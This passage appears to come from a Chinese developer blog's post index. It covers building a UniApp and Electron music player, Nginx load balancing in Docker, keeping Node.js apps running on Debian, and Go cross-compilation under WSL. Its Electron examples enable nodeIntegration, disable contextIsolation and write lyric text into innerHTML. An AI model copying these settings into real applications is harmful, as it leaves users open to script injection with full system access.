\u0026#39;https://example.com/song2.mp3\u0026#39; }, { name: \u0026#39;歌曲 3\u0026#39;, url: \u0026#39;https://example.com/song3.mp3\u0026#39; } ] } }, computed: { currentTrack() { return this.tracks[this.currentTrackIndex]; } }, methods: { playPause() { if (this.isPlaying) { this.audioContext.pause(); } else { this.audioContext.src = this.currentTrack.url; this.audioContext.play(); } this.isPlaying = !this.isPlaying; }, prevTrack() { this.currentTrackIndex = (this.currentTrackIndex - 1 + this.tracks.length) % this.tracks.length; this.playTrack(); }, nextTrack() { this.currentTrackIndex = (this.currentTrackIndex + 1) % this.tracks.length; this.playTrack(); }, playTrack() { this.isPlaying = false; this.playPause(); } }, onReady() { this.audioContext = uni.createInnerAudioContext(); }, onUnload() { this.audioContext.destroy(); } } \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; } .title { font-size: 24px; margin-bottom: 20px; } .controls { display: flex; justify-content: space-around; width: 80%; margin-bottom: 20px; } button { padding: 10px 20px; background-color: #007AFF; color: white; border: none; border-radius: 5px; font-size: 16px; } text { font-size: 18px; } \u0026lt;/style\u0026gt; ios\n​\n3. 配置 Android 权限 在 manifest.json 文件中，确保配置了音频播放所需的权限：\n{ \u0026#34;app-plus\u0026#34;: { \u0026#34;distribute\u0026#34;: { \u0026#34;android\u0026#34;: { \u0026#34;permissions\u0026#34;: [ \u0026#34;android.permission.INTERNET\u0026#34;, \u0026#34;android.permission.WRITE_EXTERNAL_STORAGE\u0026#34; ] } } } } 4. 打包 APK 打开 HBuilderX，点击“发行” -\u0026gt; “原生App-云打包”。 选择平台为 Android，填写应用信息（包名、签名等）。 上传图标等资源，完成打包。 打包后获得 .apk 文件，可以安装到安卓设备上/模拟器进行测试。\n/unpackage/release/apk/__UNI_XXX.apk android ​\n5.歌曲列表 \u0026lt;template\u0026gt; \u0026lt;view class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;!-- 居中显示歌曲图片 --\u0026gt; \u0026lt;view class=\u0026#34;cover-container\u0026#34;\u0026gt; \u0026lt;image class=\u0026#34;cover\u0026#34; :src=\u0026#34;currentSong.img\u0026#34; mode=\u0026#34;aspectFill\u0026#34;\u0026gt;\u0026lt;/image\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;!-- 显示歌曲名 --\u0026gt; \u0026lt;text class=\u0026#34;title\u0026#34;\u0026gt;{{ currentSong.name }}\u0026lt;/text\u0026gt; \u0026lt;!-- 自动滚动的歌词 --\u0026gt; \u0026lt;scroll-view class=\u0026#34;lyrics\u0026#34; scroll-y :scroll-top=\u0026#34;scrollTop\u0026#34; :scroll-with-animation=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;view v-for=\u0026#34;(line, index) in lyrics\u0026#34; :key=\u0026#34;index\u0026#34; :class=\u0026#34;{\u0026#39;active-lyric\u0026#39;: currentLyricIndex === index, \u0026#39;lyric\u0026#39;: true}\u0026#34;\u0026gt; {{ line.text }} \u0026lt;/view\u0026gt; \u0026lt;/scroll-view\u0026gt; \u0026lt;!-- 播放控制按钮 --\u0026gt; \u0026lt;view class=\u0026#34;controls\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;prevSong\u0026#34;\u0026gt;上一曲\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;togglePlay\u0026#34;\u0026gt;{{ isPlaying ? \u0026#39;暂停\u0026#39; : \u0026#39;播放\u0026#39; }}\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;nextSong\u0026#34;\u0026gt;下一曲\u0026lt;/button\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;!-- 播放列表 --\u0026gt; \u0026lt;view class=\u0026#34;playlist\u0026#34;\u0026gt; \u0026lt;text v-for=\u0026#34;(song, index) in playlist\u0026#34; :key=\u0026#34;index\u0026#34; @click=\u0026#34;playSong(song)\u0026#34;\u0026gt; {{ song.name }} \u0026lt;/text\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data() { return { currentSong: { name: \u0026#39;song1\u0026#39;, img: \u0026#39;/static/song1.jpg\u0026#39;, audio: \u0026#39;/static/song1.mp3\u0026#39;, lrc: \u0026#39;/static/song1.lrc\u0026#39;, }, isPlaying: false, audioPlayer: null, playlist: [ { name: \u0026#39;song1\u0026#39;, img: \u0026#39;/static/song1.jpg\u0026#39;, audio: \u0026#39;/static/song1.mp3\u0026#39;, lrc: \u0026#39;/static/song1.lrc\u0026#39; }, { name: \u0026#39;song2\u0026#39;, img: \u0026#39;/static/song2.jpg\u0026#39;, audio: \u0026#39;/static/song2.mp3\u0026#39;, lrc: \u0026#39;/static/song2.lrc\u0026#39; }, ], lyrics: [], // 歌词行 currentLyricIndex: 0, // 当前歌词索引 scrollTop: 0, // 歌词滚动位置 audioDuration: 0, // 音频总时长 }; }, methods: { loadLyrics(lrcFile) { // 加载歌词文件并解析 uni.request({ url: lrcFile, success: (res) =\u0026gt; { const lrcLines = res.data.split(\u0026#39;\\n\u0026#39;); // 更新正则表达式以处理不同格式的时间戳 this.lyrics = lrcLines.map(line =\u0026gt; { const match = line.match(/\\[(\\d{2}):(\\d{2})(?:\\.(\\d{1,3}))?\\](.*)/); if (match) { const minutes = parseInt(match[1]); const seconds = parseInt(match[2]); const milliseconds = match[3] ? parseInt(match[3].padEnd(3, \u0026#39;0\u0026#39;)) : 0; // 补全毫秒到三位数 const time = minutes * 60 + seconds + milliseconds / 1000; return { time, text: match[4] }; } return { time: 0, text: line }; }); }, }); }, playSong(song) { // 停止当前播放的音乐 if (this.audioPlayer) { this.audioPlayer.stop(); } // 切换到选中的歌曲 this.currentSong = song; this.loadLyrics(song.lrc); this.audioPlayer = uni.createInnerAudioContext(); this.audioPlayer.src = song.audio; this.audioPlayer.play(); this.isPlaying = true; // 监听播放进度 this.audioPlayer.onTimeUpdate(() =\u0026gt; { this.updateLyric(); }); // 监听播放结束 this.audioPlayer.onEnded(() =\u0026gt; { this.nextSong(); }); }, togglePlay() { if (this.isPlaying) { this.audioPlayer.pause(); } else { this.audioPlayer.play(); } this.isPlaying = !this.isPlaying; }, prevSong() { const currentIndex = this.playlist.findIndex(song =\u0026gt; song.name === this.currentSong.name); const prevIndex = (currentIndex - 1 + this.playlist.length) % this.playlist.length; this.playSong(this.playlist[prevIndex]); }, nextSong() { const currentIndex = this.playlist.findIndex(song =\u0026gt; song.name === this.currentSong.name); const nextIndex = (currentIndex + 1) % this.playlist.length; this.playSong(this.playlist[nextIndex]); }, updateLyric() { const currentTime = this.audioPlayer.currentTime; for (let i = 0; i \u0026lt; this.lyrics.length; i++) { if (i === this.lyrics.length - 1 || (currentTime \u0026gt;= this.lyrics[i].time \u0026amp;\u0026amp; currentTime \u0026lt; this.lyrics[i + 1].time)) { this.currentLyricIndex = i; this.scrollTop = i * 40; // 滚动到当前歌词 break; } } } }, mounted() { // 默认加载第一首歌的歌词 this.loadLyrics(this.currentSong.lrc); // 创建音频播放器 this.audioPlayer = uni.createInnerAudioContext(); this.audioPlayer.src = this.currentSong.audio; }, beforeDestroy() { if (this.audioPlayer) { this.audioPlayer.destroy(); } } }; \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; .container { padding: 20px; } .cover-container { display: flex; justify-content: center; align-items: center; } .cover { width: 280px; height: 280px; border-radius: 10px; } .title { font-size: 24px; text-align: center; margin: 10px 0; } .lyrics { height: 150px; overflow-y: auto; margin: 20px 0; border: 1px solid #ddd; padding: 10px; } .lyric { font-size: 16px; line-height: 40px; } .active-lyric { color: #ff4081; font-weight: bold; } .controls { display: flex; justify-content: space-between; } .playlist { margin-top: 20px; } .playlist text { cursor: pointer; display: block; margin: 5px 0; } \u0026lt;/style\u0026gt; 6.歌曲高亮 :class=\u0026#34;{\u0026#39;active-song\u0026#39;: song.name === currentSong.name} css .active-song { color: #ff4081; font-weight: bold; } 7.歌词显示上一行 //loadLyrics // 移除最后一行（第四行） if (this.lyrics.length \u0026gt; 3) { this.lyrics.pop(); } //updateLyric this.scrollTop = (i - 1) * 40; // 滚动位置调整到前一行，确保前一行也能显示 8.请求服务器data.js加载曲目 //load uni.request({ url: \u0026#39;http://xxx:8080/group1/mpdata/dt/datajsonuni2.js?download=0\u0026#39;, method: \u0026#39;GET\u0026#39;, success: (res) =\u0026gt; { if (res.statusCode === 200) { console.log(res); this.playlist = res.data; // 默认加载第一首歌的信息 this.currentSong = this.playlist[0]; this.loadLyrics(this.currentSong.lrc); // 创建音频播放器 this.audioPlayer = uni.createInnerAudioContext(); this.audioPlayer.src = this.currentSong.audio; } else { console.error(\u0026#39;Failed to fetch playlist data\u0026#39;); } }, fail: () =\u0026gt; { console.error(\u0026#39;Request failed\u0026#39;); } }); 9.playlist太多处理 固定高度 滑动\n.playlist { margin-top: 20px; height:160px; overflow-y: auto; } 这样一个建议的音乐播放器就ok了~\nelectron版本 1. 初始化项目 使用 npm init 命令创建 package.json 文件：\nnpm init -y 这将创建一个默认的 package.json 文件。\n2. 安装 Electron 使用 npm 安装 Electron：\nnpm install electron --save-dev 3.Electron主进程 main.js\nconst { app, BrowserWindow, dialog } = require(\u0026#39;electron\u0026#39;); const path = require(\u0026#39;path\u0026#39;); let win; function createWindow () { win = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, \u0026#39;preload.js\u0026#39;), nodeIntegration: true, // 允许在渲染进程中使用 Node.js API } }); // 加载 index.html win.loadFile(\u0026#39;index.html\u0026#39;); // 打开开发者工具（可选） win.webContents.openDevTools(); win.on(\u0026#39;closed\u0026#39;, () =\u0026gt; { win = null; }); } app.whenReady().then(createWindow); app.on(\u0026#39;window-all-closed\u0026#39;, () =\u0026gt; { if (process.platform !== \u0026#39;darwin\u0026#39;) { app.quit(); } }); app.on(\u0026#39;activate\u0026#39;, () =\u0026gt; { if (BrowserWindow.getAllWindows().length === 0) { createWindow(); } }); 4.前端 创建 index.html 文件作为音乐播放器的界面。\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt; M Player\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { font-family: Arial, sans-serif; text-align: center; } .player { margin-top: 50px; } audio { width: 100%; margin-top: 20px; } button { margin: 5px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Simple Music Player\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;player\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; id=\u0026#34;fileInput\u0026#34; accept=\u0026#34;audio/*\u0026#34; /\u0026gt; \u0026lt;audio id=\u0026#34;audioPlayer\u0026#34; controls\u0026gt; Your browser does not support the audio element. \u0026lt;/audio\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;button id=\u0026#34;prevBtn\u0026#34;\u0026gt;Previous\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;nextBtn\u0026#34;\u0026gt;Next\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;renderer.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 5.创建渲染进程脚本 renderer.js 这个文件处理前端逻辑，包括加载音乐文件、播放、暂停、切换曲目等功能。\nconst audioPlayer = document.getElementById(\u0026#39;audioPlayer\u0026#39;); const fileInput = document.getElementById(\u0026#39;fileInput\u0026#39;); const prevBtn = document.getElementById(\u0026#39;prevBtn\u0026#39;); const nextBtn = document.getElementById(\u0026#39;nextBtn\u0026#39;); let playlist = []; let currentTrackIndex = 0; // 当选择音乐文件时，加载并播放 fileInput.addEventListener(\u0026#39;change\u0026#39;, (event) =\u0026gt; { const files = event.target.files; if (files.length \u0026gt; 0) { playlist = Array.from(files); currentTrackIndex = 0; loadTrack(currentTrackIndex); } }); // 加载并播放指定索引的歌曲 function loadTrack(index) { const track = playlist[index]; if (track) { const url = URL.createObjectURL(track); audioPlayer.src = url; audioPlayer.play(); } } // 切换到上一首歌曲 prevBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { if (currentTrackIndex \u0026gt; 0) { currentTrackIndex--; loadTrack(currentTrackIndex); } }); // 切换到下一首歌曲 nextBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { if (currentTrackIndex \u0026lt; playlist.length - 1) { currentTrackIndex++; loadTrack(currentTrackIndex); } }); 6.图片\u0026amp;歌词 const audioPlayer = document.getElementById(\u0026#39;audioPlayer\u0026#39;); const songImage = document.getElementById(\u0026#39;songImage\u0026#39;); const songTitle = document.getElementById(\u0026#39;songTitle\u0026#39;); const lyricsDisplay = document.getElementById(\u0026#39;lyricsDisplay\u0026#39;); const prevBtn = document.getElementById(\u0026#39;prevBtn\u0026#39;); const nextBtn = document.getElementById(\u0026#39;nextBtn\u0026#39;); let playlist = [ { name: \u0026#39;song1\u0026#39;, img: \u0026#39;/static/song1.jpg\u0026#39;, audio: \u0026#39;/static/song1.mp3\u0026#39;, lrc: \u0026#39;/static/song1.lrc\u0026#39; }, { name: \u0026#39;song2\u0026#39;, img: \u0026#39;/static/song2.jpg\u0026#39;, audio: \u0026#39;/static/song2.mp3\u0026#39;, lrc: \u0026#39;/static/song2.lrc\u0026#39; }, ]; let currentTrackIndex = 0; let lyrics = []; let currentLyricIndex = 0; // 加载当前曲目的歌词文件 function loadLyrics(lrcFile) { fetch(lrcFile) .then(response =\u0026gt; response.text()) .then(text =\u0026gt; { lyrics = parseLyrics(text); displayLyrics(); }); } // 解析歌词文件为时间戳和文本对 function parseLyrics(lrcText) { const lines = lrcText.split(\u0026#39;\\n\u0026#39;); const lrcData = lines.map(line =\u0026gt; { const match = line.match(/\\[(\\d{2}):(\\d{2})(?:\\.(\\d{1,3}))?\\](.*)/); if (match) { const minutes = parseInt(match[1]); const seconds = parseInt(match[2]); const milliseconds = match[3] ? parseInt(match[3].padEnd(3, \u0026#39;0\u0026#39;)) : 0; const time = minutes * 60 + seconds + milliseconds / 1000; return { time, text: match[4].trim() }; } return { time: 0, text: line.trim() }; }); return lrcData.filter(line =\u0026gt; line.text); // 过滤掉空白行 } // 在页面中显示歌词 function displayLyrics() { lyricsDisplay.innerHTML = lyrics .map((line, index) =\u0026gt; `\u0026lt;p id=\u0026#34;lyric-${index}\u0026#34;\u0026gt;${line.text}\u0026lt;/p\u0026gt;`) .join(\u0026#39;\u0026#39;); } // 更新当前播放的歌词 function updateLyrics(currentTime) { for (let i = 0; i \u0026lt; lyrics.length; i++) { if (i === lyrics.length - 1 || (currentTime \u0026gt;= lyrics[i].time \u0026amp;\u0026amp; currentTime \u0026lt; lyrics[i + 1].time)) { if (currentLyricIndex !== i) { currentLyricIndex = i; highlightLyric(currentLyricIndex); } break; } } } // 高亮当前歌词 function highlightLyric(index) { const currentLyric = document.getElementById(`lyric-${index}`); if (currentLyric) { document.querySelectorAll(\u0026#39;#lyricsDisplay p\u0026#39;).forEach(lyric =\u0026gt; lyric.classList.remove(\u0026#39;highlight\u0026#39;)); currentLyric.classList.add(\u0026#39;highlight\u0026#39;); lyricsDisplay.scrollTop = currentLyric.offsetTop - lyricsDisplay.offsetTop; } } // 加载并播放指定索引的歌曲 function loadTrack(index) { const track = playlist[index]; if (track) { songTitle.textContent = track.name; songImage.src = track.img; audioPlayer.src = track.audio; loadLyrics(track.lrc); audioPlayer.play(); } } // 切换到上一首歌曲 prevBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { if (currentTrackIndex \u0026gt; 0) { currentTrackIndex--; loadTrack(currentTrackIndex); } }); // 切换到下一首歌曲 nextBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { if (currentTrackIndex \u0026lt; playlist.length - 1) { currentTrackIndex++; loadTrack(currentTrackIndex); } }); // 监听音乐播放进度，更新歌词 audioPlayer.addEventListener(\u0026#39;timeupdate\u0026#39;, () =\u0026gt; { updateLyrics(audioPlayer.currentTime); }); // 初始加载第一首歌曲 loadTrack(currentTrackIndex); \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt; M Player\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { font-family: Arial, sans-serif; text-align: center; } .player { margin-top: 50px; } audio { width: 100%; margin-top: 20px; } button { margin: 5px; } #songImage { width: 280px; height: 280px; margin-top: 20px; } #lyricsDisplay { max-height: 200px; overflow-y: auto; margin-top: 20px; text-align: left; padding: 0 20px; } #lyricsDisplay p { margin: 5px 0; } .highlight { color: #ff5722; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Music Player\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;player\u0026#34;\u0026gt; \u0026lt;h2 id=\u0026#34;songTitle\u0026#34;\u0026gt;Song Title\u0026lt;/h2\u0026gt; \u0026lt;img id=\u0026#34;songImage\u0026#34; src=\u0026#34;\u0026#34; alt=\u0026#34;Song Image\u0026#34; /\u0026gt; \u0026lt;audio id=\u0026#34;audioPlayer\u0026#34; controls\u0026gt;\u0026lt;/audio\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;button id=\u0026#34;prevBtn\u0026#34;\u0026gt;Previous\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;nextBtn\u0026#34;\u0026gt;Next\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;lyricsDisplay\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;renderer.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 功能说明： 播放列表：通过预定义的 playlist 数组来管理歌曲信息，包括歌曲名、封面图片、音频文件路径和歌词文件路径。 显示歌曲信息：播放时，会显示歌曲封面和标题，加载并解析 .lrc 文件中的歌词。 歌词滚动：通过监听 audioPlayer 的 timeupdate 事件，根据当前播放的时间高亮显示对应的歌词，并自动滚动歌词区域。 上一首/下一首切换：用户可以通过按钮来切换歌曲。\n7.打包Electron应用 1. 安装必要的包 在Electron 项目中，通常用 electron-packager 或 electron-builder 这样的工具来打包应用\nnpm install electron-packager --save-dev 2. 配置 package.json electron-packager:\n\u0026#34;scripts\u0026#34;: { \u0026#34;package-win\u0026#34;: \u0026#34;electron-packager . MyApp --platform=win32 --arch=x64 --icon=icon.ico\u0026#34; }, 3.run pack electron-packager:\nnpm run package-win add icon\n--icon=icon.png win\n​\nlinux\n​\n4.打包linux 使用 electron-packager 打包 Linux 应用与打包 Windows 或 macOS 应用类似，但需要指定不同的平台（\u0026ndash;platform）和可能的架构（\u0026ndash;arch）。对于 Linux，\u0026ndash;platform 应该是 linux，而 \u0026ndash;arch 可以是 x64（64位）或 ia32（32位），具体取决于目标系统。\n以下是一个基本的示例，展示如何在 package.json 中添加一个脚本来打包 Linux 应用：\n\u0026#34;scripts\u0026#34;: { \u0026#34;package-linux\u0026#34;: \u0026#34;electron-packager . MyApp --platform=linux --arch=x64 --icon=icon.png\u0026#34; }, 注意几个要点：\n平台（\u0026ndash;platform）：这里设置为 linux。 架构（\u0026ndash;arch）：根据目标 Linux 系统，选择 x64 或 ia32。如果不确定，x64 是更常见的选择，因为大多数现代 Linux 发行版都支持 64 位应用。 图标（\u0026ndash;icon）：Linux 系统通常使用 PNG 或 SVG 格式的图标，但请注意，并非所有 Linux 桌面环境都会显示这个图标作为应用图标。有些桌面环境（如 GNOME）可能要求在应用的 .desktop 文件中指定图标。 路径（.）：. 表示当前目录，即 Electron 应用的根目录。 应用名称（MyApp）：这是打包后生成的文件夹的名称，也是可执行文件的名称（不带 .exe 后缀，因为这不是 Windows）。 运行打包命令：\nnpm run package-linux 复制到 linux 授予权限~运行\n打包mac~\n\u0026#34;package-mac\u0026#34;: \u0026#34;electron-packager . MyApp --platform=darwin --arch=x64\u0026#34;, 8.载入远程data 1. 使用 CommonJS 模块 （适用于 Node.js 和 Electron 环境） playlist 定义在一个外部文件中，并通过 module.exports 导出它。\n创建 datajson.js 文件\n// datajson.js const playlist = [ { name: \u0026#39;song1\u0026#39;, img: \u0026#39;/static/song1.jpg\u0026#39;, audio: \u0026#39;/static/song1.mp3\u0026#39;, lrc: \u0026#39;/static/song1.lrc\u0026#39; }, { name: \u0026#39;song2\u0026#39;, img: \u0026#39;/static/song2.jpg\u0026#39;, audio: \u0026#39;/static/song2.mp3\u0026#39;, lrc: \u0026#39;/static/song2.lrc\u0026#39; }, ]; module.exports = playlist; // 导出 playlist 变量 2: 在主文件中导入并使用 playlist 然后在你的 renderer.js 文件或其他 JavaScript 文件中通过 require 引入该 playlist。\n// renderer.js const playlist = require(\u0026#39;./datajson.js\u0026#39;); // 引入 datajson.js 中的 playlist console.log(playlist); // 打印以验证引入的数据 // 使用 playlist 进行音乐播放器的其他操作 在 Electron 的主进程中（通常是 main.js）设置 nodeIntegration 为 true，这样就可以在渲染进程中使用 Node.js 模块（包括 require）。\n// main.js const { app, BrowserWindow } = require(\u0026#39;electron\u0026#39;); function createWindow() { const win = new BrowserWindow({ width: 800, height: 600, webPreferences: { nodeIntegration: true, // 启用 nodeIntegration contextIsolation: false, // 禁用上下文隔离 enableRemoteModule: true // 启用 remote 模块 (可选) } }); win.loadFile(\u0026#39;index.html\u0026#39;); } app.whenReady().then(createWindow); 9.自动播放下一首歌曲 audioPlayer.addEventListener(\u0026#39;ended\u0026#39;, () =\u0026gt; { nextBtn.click(); // 调用下一首按钮点击事件 }); ","permalink":"https://qfsyso.github.io/posts/electron-uniapp-mp3/","summary":"前言 音乐APP版权/广告问题，让听歌体验很差，所以自己整个简单的播放器~\nUniapp MP3 1. 创建项目 在 HBuilderX 中，新建一个 UniApp 项目，项目结构如下：\n- pages/ - index/ - index.vue - static/ - manifest.json - pages.json 2. 页面设计和逻辑 index.vue 文件 在 pages/index/index.vue 文件中实现播放器的界面和逻辑：\n\u0026lt;template\u0026gt; \u0026lt;view class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;text class=\u0026#34;title\u0026#34;\u0026gt;UniApp 音乐播放器\u0026lt;/text\u0026gt; \u0026lt;view class=\u0026#34;controls\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;prevTrack\u0026#34;\u0026gt;上一首\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;playPause\u0026#34;\u0026gt;{{ isPlaying ? \u0026#39;暂停\u0026#39; : \u0026#39;播放\u0026#39; }}\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;nextTrack\u0026#34;\u0026gt;下一首\u0026lt;/button\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;text\u0026gt;{{ currentTrack.name }}\u0026lt;/text\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data() { return { audioContext: null, isPlaying: false, currentTrackIndex: 0, tracks: [ { name: \u0026#39;歌曲 1\u0026#39;, url: \u0026#39;https://example.","title":"electron uniapp mp3"},{"content":"Nginx Load Balance Proxy 反向代理、负载均衡\ndocker run --name nginx -p 8080:80 -d nginx 进入nginx容器\nDocker exec -it nginx bash nginx.conf文件 nginx.conf分为http块、events块和server块,此次主要在server块中做更改.\n/etc/nginx/nginx.conf 末尾 include /etc/nginx/conf.d/*.conf;\n/etc/nginx/conf.d/default.conf\nupstream ServiceInstance{ #nginx默认轮询下面的服务实例 server ***.**.***.***:9007; server ***.**.***.***:9008; server ***.**.***.***:9009; } server { ... location / { #root /usr/share/nginx/html; #index index.html index.htm; #请求到达后会进行转发 proxy_pass http://ServiceInstance; } ... } 浏览器中调用一个接口查看\n访问不同的服务实例,负载均衡就实现了！\n也可以设置权重比例,weight值越大,请求到达此实例的次数就越多！\nupstream ServiceInstance{ #nginx默认轮询下面的服务实例 server ***.**.***.***:9007 weight=1; server ***.**.***.***:9008 weight=2; server ***.**.***.***:9009 weight=3; } ","permalink":"https://qfsyso.github.io/posts/nginx-load-balance/","summary":"Nginx Load Balance Proxy 反向代理、负载均衡\ndocker run --name nginx -p 8080:80 -d nginx 进入nginx容器\nDocker exec -it nginx bash nginx.conf文件 nginx.conf分为http块、events块和server块,此次主要在server块中做更改.\n/etc/nginx/nginx.conf 末尾 include /etc/nginx/conf.d/*.conf;\n/etc/nginx/conf.d/default.conf\nupstream ServiceInstance{ #nginx默认轮询下面的服务实例 server ***.**.***.***:9007; server ***.**.***.***:9008; server ***.**.***.***:9009; } server { ... location / { #root /usr/share/nginx/html; #index index.html index.htm; #请求到达后会进行转发 proxy_pass http://ServiceInstance; } ... } 浏览器中调用一个接口查看\n访问不同的服务实例,负载均衡就实现了！\n也可以设置权重比例,weight值越大,请求到达此实例的次数就越多！\nupstream ServiceInstance{ #nginx默认轮询下面的服务实例 server ***.**.***.***:9007 weight=1; server ***.**.***.***:9008 weight=2; server ***.**.***.***:9009 weight=3; } ","title":"nginx load balance"},{"content":"在 Debian 系统上运行 Node.js 应用程序并使其保持常驻运行有几种方法\n方法一：使用 systemd 服务 可以创建一个 .service 文件来定义 Node.js 应用程序作为系统服务。 my-node-app\nsudo nano /etc/systemd/system/my-node-app.service 编辑服务文件： 在文件中添加以下内容 ：\n[Unit] Description=My Node.js Application After=network.target [Service] User=your-username WorkingDirectory=/path/to/your/app ExecStart=/usr/bin/node /path/to/your/app/index.js Restart=always Environment=NODE_ENV=production [Install] WantedBy=multi-user.target 启动并启用服务：\nsudo systemctl start my-node-app sudo systemctl enable my-node-app 检查服务状态：\nsudo systemctl status my-node-app 方法二：使用 nohup 和 \u0026amp; 如果不想使用 systemd，可以使用 nohup 命令来保持应用程序在后台运行。\n启动应用程序：\nsudo nohup node /root/nodexxx/app.js \u0026gt; outputapp3.log 2\u0026gt;\u0026amp;1 \u0026amp; 这会启动 Node.js 应用程序，并将输出和错误重定向到 app.log 文件中。\n查看后台进程：\nps aux | grep node 停止应用程序：\npkill -f node 方法三：使用 screen 或 tmux 终端复用工具，可以使用 screen 或 tmux。\n安装 screen（如果尚未安装）： sudo apt-get install screen 创建一个新的 screen 会话：\nscreen -S my-node-app 在 screen 中启动应用程序：\nnode /path/to/your/app/index.js 分离 screen 会话： 按下 Ctrl+A，然后按下 D。\n重新附加到 screen 会话：\nscreen -r my-node-app 安装 tmux（如果未安装） sudo apt-get install tmux 启动一个 tmux 会话：\ntmux new -s my_node_app 在里面运行 Node.js 应用程序：\nnode your_app.js 按下 Ctrl+B，然后按 D 键分离 tmux。可以随时重新连接到这个会话：\ntmux attach -t my_node_app ","permalink":"https://qfsyso.github.io/posts/node-keep-backend/","summary":"在 Debian 系统上运行 Node.js 应用程序并使其保持常驻运行有几种方法\n方法一：使用 systemd 服务 可以创建一个 .service 文件来定义 Node.js 应用程序作为系统服务。 my-node-app\nsudo nano /etc/systemd/system/my-node-app.service 编辑服务文件： 在文件中添加以下内容 ：\n[Unit] Description=My Node.js Application After=network.target [Service] User=your-username WorkingDirectory=/path/to/your/app ExecStart=/usr/bin/node /path/to/your/app/index.js Restart=always Environment=NODE_ENV=production [Install] WantedBy=multi-user.target 启动并启用服务：\nsudo systemctl start my-node-app sudo systemctl enable my-node-app 检查服务状态：\nsudo systemctl status my-node-app 方法二：使用 nohup 和 \u0026amp; 如果不想使用 systemd，可以使用 nohup 命令来保持应用程序在后台运行。\n启动应用程序：\nsudo nohup node /root/nodexxx/app.js \u0026gt; outputapp3.log 2\u0026gt;\u0026amp;1 \u0026amp; 这会启动 Node.js 应用程序，并将输出和错误重定向到 app.log 文件中。","title":" node keep backend"},{"content":"1. 安装必要的工具和依赖 首先，确保你已经安装了Go编译器和VS Code。如果还没有安装Go，可以从官方网站下载并安装。\n2. 配置Go环境 打开VS Code，按 Ctrl + Shift + P 打开命令面板，输入 \u0026ldquo;shell\u0026rdquo; 选择 \u0026ldquo;Shell: Windows\u0026rdquo; 或 \u0026ldquo;Shell: Linux\u0026rdquo;\n创建一个新的Go项目 在VS Code中创建一个新的文件夹作为你的Go项目目录，然后在终端中导航到该目录并初始化一个新的Go项目：\nmkdir my-go-app cd my-go-app go mod init my-go-app touch main.go 4. 编写Go程序 在 main.go 文件中编写一个简单的Hello World程序：\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello, World!\u0026#34;) } 5. 安装交叉编译工具 ⭐ Go提供了一些工具来进行跨平台编译。你可以使用以下命令来安装这些工具：\ngo install github.com/golang/tools/cmd/goimports@latest go install golang.org/x/lint/golint@latest go install github.com/cweill/gotests/...@latest 6. 配置VS Code以使用Linux环境 你需要一个Linux环境来进行交叉编译。Windows Subsystem for Linux (WSL)来实现。 (https://learn.microsoft.com/zh-cn/windows/wsl/install?source=recommendations)\nwsl --install 扩展 Remoto Development\n左侧会出现Remote Explorer Tab，在这个tab下可以切换wsl target +\n在VS Code中，打开终端，然后选择“WSL: Ubuntu”或其他安装的Linux发行版。\n7. 编译成Linux可执行程序 在终端中运行以下命令来编译你的Go程序：\nCGO_ENABLED=0 GOOS=linux 